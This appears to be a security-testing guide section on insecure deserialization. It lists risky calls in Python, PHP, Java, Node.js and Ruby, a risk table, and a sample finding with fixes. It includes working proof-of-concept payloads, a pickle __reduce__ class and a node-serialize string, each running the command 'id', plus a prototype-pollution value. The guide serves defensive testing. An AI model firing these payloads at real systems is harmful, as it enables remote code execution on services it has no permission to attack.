# Insecure Deserialization

Test whether the application deserializes untrusted data without proper
validation, which can lead to remote code execution or object injection.

## Probe Patterns

### Language-Specific Vectors

#### Python — pickle, joblib, dill

```python
# Look for in codebase
pickle.loads(data)
pickle.load(file)
joblib.load(file)
dill.loads(data)
shelve.open(file)
```

Test payload (base64-encoded pickle that executes `id`):
```python
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
payload = base64.b64encode(pickle.dumps(RCE()))
```

#### PHP — unserialize

```php
// Look for in codebase
unserialize($data);
unserialize($_POST['data']);
```

Test: PHP object injection via gadget chains. Requires knowledge of available
classes in the codebase. Focus on classes with `__destruct`, `__wakeup`,
`__toString` magic methods.

#### Java — readObject, XStream, Jackson

```java
// Look for
ObjectInputStream.readObject()
XStream.fromXML()
XMLDecoder.readObject()
Jackson ObjectMapper.enableDefaultTyping()
```

Test: classic ysoserial gadget chains (CommonsCollections, CommonsBeanUtils, etc.)
or XML/XStream deserialization with external entity injection.

#### Node.js — unserialize via node-serialize, serialize-javascript

```javascript
// Look for
require('node-serialize').unserialize(data)
eval('(' + data + ')')              // Anti-pattern eval
new Function('return ' + data)()    // Equivalent to eval
vm.runInNewContext(data)            // VM sandbox escape
```

Test:
```json
{"constructor": {"prototype": {"polluted": true}}}
{"rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

#### Ruby — YAML.load, Marshal.load

```ruby
# Look for
YAML.load(user_input)
Marshal.load(data)
```

YAML is especially dangerous because `YAML.load` can instantiate arbitrary objects.

### Indicators

| Code Pattern | Risk |
|-------------|------|
| `pickle.loads(data)` | Critical — RCE |
| `unserialize($_GET['data'])` | Critical — RCE via gadget chain |
| `ObjectInputStream.readObject()` | High — RCE via gadget chain |
| `YAML.load(input)` | Critical — arbitrary object instantiation |
| `eval(\` + data + \`)` | Critical — direct RCE |
| `new Function(...)` | Critical — direct RCE |
| `JSON.parse(data)` | Low — unless prototype pollution |
| `msgpack.unpack(data)` | Medium — depends on contained types |

## Finding Format Example

```yaml
id: RT-040
title: Insecure deserialization via pickle.loads in data pipeline
category: Insecure Deserialization
severity: Critical
cwe: CWE-502
blast_radius: Remote code execution on the data processing server
location: src/workers/data_processor.py:88
detection_difficulty: Medium
confidence: High
kev_listed: false
epss_score: null
functional_requirements:
  - Replace pickle.loads with a safe serialization format (JSON, msgpack)
  - If pickle must be used, validate and sanitize input before deserialization
  - Restrict network access for the data processing worker
non_functional_requirements:
  - Deserialized types must be explicitly whitelisted
  - Input must be signed/tamper-evident
acceptance_criteria:
  - Pickle.loads is removed or wrapped with input validation
  - Arbitrary pickle payloads are rejected
```
